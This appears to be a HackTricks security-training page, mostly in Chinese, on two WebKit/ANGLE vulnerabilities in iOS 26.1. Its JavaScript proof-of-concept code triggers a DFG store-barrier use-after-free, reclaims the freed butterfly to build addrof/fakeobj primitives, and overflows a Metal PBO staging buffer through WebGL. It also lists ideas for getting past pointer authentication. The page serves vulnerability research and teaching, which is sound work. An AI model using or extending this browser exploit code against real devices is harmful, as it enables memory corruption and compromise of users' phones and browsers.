# WebKit DFG Store-Barrier UAF + ANGLE PBO OOB (iOS 26.1)

{{#include ../../banners/hacktricks-training.md}}

## Summary
- **DFG Store Barrier bug (CVE-2025-43529)**: In `DFGStoreBarrierInsertionPhase.cpp`，一个 **被标记为 escaped 的 Phi node 而其 Upsilon inputs 未被标记** 导致该阶段在后续对象存储时**跳过插入 write barrier**。在 GC 压力下，这会让 JSC 释放仍然可达的对象 → **use-after-free**。
- **Exploit target**: 强制一个 **Date** 对象触发 materialize 它的 butterfly（例如 `a[0] = 1.1`），使该 butterfly 被释放，然后被 **reclaimed** 用作数组元素存储以构造 boxed/unboxed 混淆 → `addrof`/`fakeobj` 原语。
- **ANGLE Metal PBO bug (CVE-2025-14174)**: Metal 后端使用 `UNPACK_IMAGE_HEIGHT` 而非真实纹理高度来分配 PBO staging buffer。提供一个很小的 unpack height 后再执行一个大的 `texImage2D` 会导致 **staging-buffer OOB write**（在下面的 PoC 中约为 240KB）。
- **PAC blockers on arm64e (iOS 26.1)**: TypedArray 的 `m_vector` 和 JSArray 的 `butterfly` 都是 PAC-signed；构造带有攻击者选择指针的 fake objects 会因 `EXC_BAD_ACCESS`/`EXC_ARM_PAC` 而崩溃。只有重用**已签名**的 butterflies（boxed/unboxed 重新解释）才可行。

## Triggering the DFG missing barrier → UAF
```js
function triggerUAF(flag, allocCount) {
const A = {p0: 0x41414141, p1: 1.1, p2: 2.2};
arr[arr_index] = A;                 // Tenure A in old space
const a = new Date(1111); a[0] = 1.1; // Force Date butterfly

// GC pressure
for (let j = 0; j < allocCount; ++j) forGC.push(new ArrayBuffer(0x800000));

const b = {p0: 0x42424242, p1: 1.1};
let f = b; if (flag) f = 1.1;       // Phi escapes, Upsilon not escaped
A.p1 = f;                           // Missing barrier state set up

for (let i = 0; i < 1e6; ++i) {}    // GC race window
b.p1 = a;                           // Store without barrier → frees `a`/butterfly
}
```
Key points:
- 将 **A** 放入 old space，以触发 generational barriers。
- 创建一个带索引的 **Date**，使 **butterfly** 成为被释放的目标。
- Spray `ArrayBuffer(0x800000)` 来强制 GC 并扩大 race。
- Phi/Upsilon escape mismatch 会阻止 barrier 的插入；`b.p1 = a` 在 **without a write barrier** 的情况下运行，因此 GC 会回收 `a`/butterfly。

## Butterfly 回收 → boxed/unboxed 混淆
在 GC 释放 Date 的 butterfly 之后，spray 一些 arrays，使得被释放的 slab 被重用为两个具有不同 element kinds 的数组的 elements：
```js
boxed_arr[0]   = obj;          // store as boxed pointer
const addr     = ftoi(unboxed_arr[0]); // read as float64 → addr leak
unboxed_arr[0] = itof(addr);   // write pointer bits as float
const fake     = boxed_arr[0]; // reinterpret as object → fakeobj
```
在 **iOS 26.1 (arm64e)** 上的状态：
- **可用：** `addrof`, `fakeobj`, 每次运行 20+ address leaks，inline-slot read/write（针对已知 inline fields）。
- **尚不稳定：** 通过 inline-slot backings 实现通用的 `read64`/`write64`。

## PAC 在 arm64e 上的约束（为什么 fake objects 会崩溃）
- **TypedArray `m_vector`** 和 **JSArray `butterfly`** 使用 PAC 签名；伪造指针会导致 `EXC_BAD_ACCESS` / 可能的 `EXC_ARM_PAC`。
- confusion primitive 能工作是因为它 **reuses legitimate signed butterflies**；引入无签名的攻击者指针会导致认证失败。
- 记录的潜在绕过思路：跳过认证的 JIT 路径、对攻击者指针进行签名的 gadgets，或通过 ANGLE OOB 进行 pivoting。

## ANGLE Metal PBO under-allocation → OOB write
使用一个极小的 unpack height 来缩小 staging buffer，然后上传一个较大的 texture 使得 copy 溢出：
```js
gl.pixelStorei(gl.UNPACK_IMAGE_HEIGHT, 16);  // alloc height
// staging = 256 * 16 * 4 = 16KB
// actual  = 256 * 256 * 4 = 256KB → ~240KB OOB

gl.texImage2D(gl.TEXTURE_2D, 0, gl.DEPTH_COMPONENT32F,
256, 256, 0, gl.DEPTH_COMPONENT, gl.FLOAT, 0);
```
备注：
- 在 `TextureMtl.cpp` 中的漏洞：暂存缓冲区在 PBO 路径上使用 `UNPACK_IMAGE_HEIGHT`，而不是实际的纹理高度。
- 在所引用的探测中，WebGL2 PBO 触发已接入，但在 iOS 26.1 上尚未被可靠观测到。

## 参考
- [WebKit-UAF-ANGLE-OOB-Analysis](https://github.com/zeroxjf/WebKit-UAF-ANGLE-OOB-Analysis)
- [jir4vv1t/CVE-2025-43529](https://github.com/jir4vv1t/CVE-2025-43529)

{{#include ../../banners/hacktricks-training.md}}
